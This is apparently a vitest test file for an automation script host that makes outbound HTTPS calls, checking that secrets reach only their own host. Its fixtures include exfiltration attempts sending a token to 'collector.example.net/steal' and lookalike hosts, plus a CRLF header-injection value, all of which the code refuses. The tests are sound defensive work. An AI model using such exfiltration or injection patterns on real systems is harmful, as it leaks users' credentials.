import { AppError } from "@anygriddb/core";
import { describe, expect, it } from "vitest";
import type { PublicApiDeps } from "../public-api/index.js";
import type { OutboundAnswer, requestOutbound } from "../outbound/index.js";
import {
  bindingsWithin,
  SCRIPT_ANSWER_BYTES,
  SCRIPT_REQUESTS,
  scriptHost,
  type ScriptSecret,
} from "./host.js";

type Sent = {
  url: string;
  options: Omit<Parameters<typeof requestOutbound>[0], "url">;
};

/** A host whose calls go nowhere: each is kept, and answered 200. */
function hostWith(secrets: Record<string, ScriptSecret> = {}) {
  const sent: Sent[] = [];
  const request: typeof requestOutbound = ({ url, ...options }) => {
    sent.push({ url, options });
    const answer: OutboundAnswer = {
      status: 200,
      headers: { "content-type": "application/json" },
      body: '{"ok":true}',
    };
    return Promise.resolve(answer);
  };
  const host = scriptHost(
    // A call to an address reads nothing of the instance.
    {} as PublicApiDeps,
    {
      author: {
        user: {
          id: "00000000-0000-4000-8000-000000000001",
          email: "author@example.org",
          displayName: "Author",
          isAdmin: false,
          isSupport: false,
          isAuditor: false,
          instanceRoles: [],
        },
        bindings: [],
      },
      baseId: "00000000-0000-4000-8000-000000000002",
      origin: { source: "automation:test" },
      secrets: new Map(Object.entries(secrets)),
      request,
    },
  );
  return { host, sent };
}

/** The code a refused call carries. */
async function refusal(call: Promise<unknown>): Promise<string> {
  try {
    await call;
  } catch (error) {
    if (error instanceof AppError) return error.code;
    throw error;
  }
  return "allowed";
}

describe("a script's call to an address", () => {
  it("sends what the script wrote, and answers status, headers, and body", async () => {
    const { host, sent } = hostWith();
    const answer = await host("http.request", {
      url: "https://api.example.org/v1/items?page=2",
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: '{"name":"x"}',
    });
    expect(answer).toEqual({
      status: 200,
      headers: { "content-type": "application/json" },
      body: '{"ok":true}',
    });
    expect(sent).toEqual([
      {
        url: "https://api.example.org/v1/items?page=2",
        options: {
          method: "POST",
          headers: {
            "user-agent": "AnyGridDB-Automation/1",
            "Content-Type": "application/json",
          },
          body: '{"name":"x"}',
          maxBytes: SCRIPT_ANSWER_BYTES,
        },
      },
    ]);
  });

  it("puts a secret where its name is written, for its own host", async () => {
    const { host, sent } = hostWith({
      TOKEN: { host: "api.example.org", value: "s3cr3t" },
      KEY: { host: "api.example.org", value: "k-1" },
    });
    await host("http.request", {
      url: "https://api.example.org/v1/items?key={{secret.KEY}}",
      headers: { Authorization: "Bearer {{ secret.TOKEN }}" },
      body: '{"token":"{{secret.TOKEN}}"}',
      method: "PUT",
    });
    expect(sent[0]).toMatchObject({
      url: "https://api.example.org/v1/items?key=k-1",
      options: {
        headers: { Authorization: "Bearer s3cr3t" },
        body: '{"token":"s3cr3t"}',
      },
    });
  });

  it("says who calls, unless the script does, and sends no header of two lines", async () => {
    const { host, sent } = hostWith({
      BROKEN: { host: "api.example.org", value: "a\r\nX-Injected: 1" },
    });
    await host("http.request", {
      url: "https://api.example.org/",
      headers: { "User-Agent": "my-script/2" },
    });
    expect(sent[0]?.options.headers).toEqual({ "User-Agent": "my-script/2" });
    expect(
      await refusal(
        host("http.request", {
          url: "https://api.example.org/",
          headers: { Authorization: "{{secret.BROKEN}}" },
        }),
      ),
    ).toBe("invalid_script_request");
    expect(sent).toHaveLength(1);
  });

  it("sends a secret to no other host, wherever the script writes it", async () => {
    const { host, sent } = hostWith({
      TOKEN: { host: "api.example.org", value: "s3cr3t" },
    });
    for (const request of [
      {
        url: "https://collector.example.net/steal",
        headers: { Authorization: "Bearer {{secret.TOKEN}}" },
      },
      { url: "https://collector.example.net/?t={{secret.TOKEN}}" },
      { url: "https://collector.example.net/", body: "{{secret.TOKEN}}" },
      // A host that only ends like the secret's.
      {
        url: "https://evil-api.example.org/",
        headers: { "X-Key": "{{secret.TOKEN}}" },
      },
      { url: "https://api.example.org.example.net/?t={{secret.TOKEN}}" },
    ]) {
      expect(await refusal(host("http.request", request))).toBe(
        "secret_for_another_host",
      );
    }
    expect(sent).toEqual([]);
  });

  it("refuses a secret that would name the host, or one it does not keep", async () => {
    const { host, sent } = hostWith({
      HOST: { host: "api.example.org", value: "collector.example.net" },
    });
    // The host is read before any secret is put in: a name written
    // there is no host a secret is kept for.
    expect(
      await refusal(
        host("http.request", { url: "https://{{secret.HOST}}/path" }),
      ),
    ).toBe("secret_for_another_host");
    expect(
      await refusal(
        host("http.request", {
          url: "https://api.example.org/",
          headers: { Authorization: "{{secret.NONE}}" },
        }),
      ),
    ).toBe("unknown_secret");
    expect(sent).toEqual([]);
  });

  it("refuses what is not a plain request to an https address", async () => {
    const { host, sent } = hostWith();
    for (const request of [
      { url: "http://api.example.org/" },
      { url: "ftp://api.example.org/" },
      { url: "not an address" },
      { url: "https://api.example.org/", method: "TRACE" },
      { url: "https://api.example.org/", headers: { Host: "other.example" } },
      {
        url: "https://api.example.org/",
        headers: { "Transfer-Encoding": "chunked" },
      },
      { url: "https://api.example.org/", headers: { "Bad Name": "x" } },
      { url: "https://api.example.org/", redirect: "follow" },
    ]) {
      expect(await refusal(host("http.request", request))).not.toBe("allowed");
    }
    expect(sent).toEqual([]);
  });

  it("makes a bounded number of calls", async () => {
    const { host, sent } = hostWith();
    for (let made = 0; made < SCRIPT_REQUESTS; made += 1) {
      await host("http.request", { url: "https://api.example.org/" });
    }
    expect(
      await refusal(host("http.request", { url: "https://api.example.org/" })),
    ).toBe("script_requests_exhausted");
    expect(sent).toHaveLength(SCRIPT_REQUESTS);
  });
});

describe("a call that gets no answer", () => {
  it("is told to the script in a word, as a webhook's delivery is", async () => {
    const failures: Array<[Error, string]> = [
      [
        new AppError("invalid_outbound_target"),
        "Request failed: Blocked target",
      ],
      [new Error("Timeout"), "Request failed: Timeout"],
      [new Error("Answer too large"), "Request failed: Answer too large"],
      [
        Object.assign(new Error("getaddrinfo"), { code: "ENOTFOUND" }),
        "Request failed: Unknown host",
      ],
      [
        Object.assign(new Error("connect"), { code: "ECONNREFUSED" }),
        "Request failed: Connection refused",
      ],
      // What it does not know says nothing of itself.
      [
        new Error("socket hang up at 203.0.113.9"),
        "Request failed: Network error",
      ],
    ];
    for (const [failure, said] of failures) {
      const host = scriptHost({} as PublicApiDeps, {
        author: {
          user: {
            id: "00000000-0000-4000-8000-000000000001",
            email: "author@example.org",
            displayName: "Author",
            isAdmin: false,
            isSupport: false,
            isAuditor: false,
            instanceRoles: [],
          },
          bindings: [],
        },
        baseId: "00000000-0000-4000-8000-000000000002",
        origin: { source: "automation:test" },
        request: () => Promise.reject(failure),
      });
      await expect(
        host("http.request", { url: "https://api.example.org/" }),
      ).rejects.toMatchObject({
        code: "script_request_failed",
        message: said,
      });
    }
  });
});

describe("the author's roles, within the automation's base", () => {
  it("keeps the base's own and its tables', and drops every other", () => {
    const base = "00000000-0000-4000-8000-0000000000b1";
    const table = "00000000-0000-4000-8000-0000000000a1";
    const kept = bindingsWithin(
      [
        { role: "editor", scope: "base", scopeId: base },
        { role: "owner", scope: "base", scopeId: "another-base" },
        { role: "viewer", scope: "table", scopeId: table },
        { role: "owner", scope: "table", scopeId: "another-table" },
      ],
      base,
      new Set([table]),
    );
    expect(kept).toEqual([
      { role: "editor", scope: "base", scopeId: base },
      { role: "viewer", scope: "table", scopeId: table },
    ]);
  });
});
